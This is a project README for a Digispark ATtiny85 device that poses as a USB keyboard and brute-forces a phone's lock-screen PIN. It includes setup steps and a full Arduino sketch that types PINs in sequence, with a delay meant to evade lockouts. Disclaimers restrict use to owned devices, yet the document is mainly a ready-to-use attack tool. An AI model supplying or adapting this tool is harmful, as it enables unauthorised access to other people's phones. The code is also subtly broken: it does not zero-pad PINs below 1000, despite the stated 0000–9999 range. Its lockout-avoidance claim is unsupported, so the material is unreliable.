<div align="center">
  <h2>🔓 Digispark Unlock Project</h2>
  <img src="IC.jpg" alt="Digispark ATtiny85" width="300">
  <p><b>A project to demonstrate PIN brute-forcing using the Digispark ATtiny85 microcontroller.</b></p>
</div>

## 📌 Overview
The **Digispark Unlock Project** showcases how the **Digispark ATtiny85 microcontroller** can be used to automate PIN brute-forcing on a mobile device’s lock screen. This project is purely for **educational purposes** to understand the interaction between hardware and digital systems.

⚠️ **Disclaimer**: Use this project **only on devices you own** or have explicit permission to test. Unauthorized access to a device is illegal.

---

## 🚀 Features
✅ **Brute-Force PIN Combination**: Attempts PINs from `0000` to `9999` automatically.<br>
✅ **Configurable Delays**: Adjust delay timings to avoid security lockouts.<br>
✅ **Compact & Efficient**: Uses **low-power Digispark ATtiny85** microcontroller.<br>
✅ **Easy Programming**: Arduino-compatible with **DigiKeyboard Library**.<br>
✅ **USB-Based Execution**: No need for additional hardware.

---

## 🔧 Hardware Requirements
- **Microcontroller**: Digispark ATtiny85
- **Connections**:
  - **Micro USB Cable** – For programming and power supply
  - **Target Mobile Device** – For testing PIN brute-force automation

---

## 💻 Software Requirements
- **Arduino IDE** (for writing and uploading the script)
- **DigiKeyboard Library** (to simulate keyboard inputs)

---

## 📝 Installation & Setup

### Step 1: Install Required Software
1. Download and install **Arduino IDE** from [Arduino Official Site](https://www.arduino.cc/).
2. Add **Digistump Board Support** in Arduino IDE:
   - Go to **File > Preferences**.
   - Add this URL in *Additional Board Manager URLs*: `http://digistump.com/package_digistump_index.json`.
   - Open **Boards Manager**, search for **Digistump AVR Boards**, and install it.

### Step 2: Install DigiKeyboard Library
1. Open **Arduino IDE**.
2. Go to **Sketch > Include Library > Manage Libraries**.
3. Search for `DigiKeyboard` and install it.

### Step 3: Upload the Code
1. Connect your **Digispark ATtiny85** via **USB**.
2. Open Arduino IDE and paste the following code:

```cpp
#include "DigiKeyboard.h"

void setup() {}

void loop() {
  for (int pin = 0; pin <= 9999; pin++) {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.print(String(pin));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(5000); // Adjust delay to avoid security lockout
  }
}
```

3. Click **Upload** (The Digispark must be **disconnected** before compilation and reconnected when prompted).

---

## ⚙️ How It Works
1. The **Digispark ATtiny85** acts as a USB keyboard.
2. It simulates keypresses, entering **PIN numbers sequentially** (`0000` to `9999`).
3. A **5-second delay** is added to prevent security lockouts.
4. The process continues until the correct PIN is found.

---

## ⚠️ Ethical Considerations
- 🚨 **Use this tool responsibly** on **your own devices**.
- 🔒 Unauthorized use is **illegal** in many countries.
- 🎓 Intended for **learning about cybersecurity** and **hardware automation**.

---

<div align="center">
  <h3>📢 Want to Learn More?</h3>
  <p>Check out <a href="https://digistump.com/">Digistump Official Website</a> for more Digispark projects!</p>
</div>

---

## 📝 License
This project is licensed under the **MIT License**. You are free to modify and distribute it **for educational purposes only**.

---

<div align="center">
  <h3>📩 Contribute & Support</h3>
  <p>If you have suggestions, feel free to submit a pull request! 🤝</p>
</div>
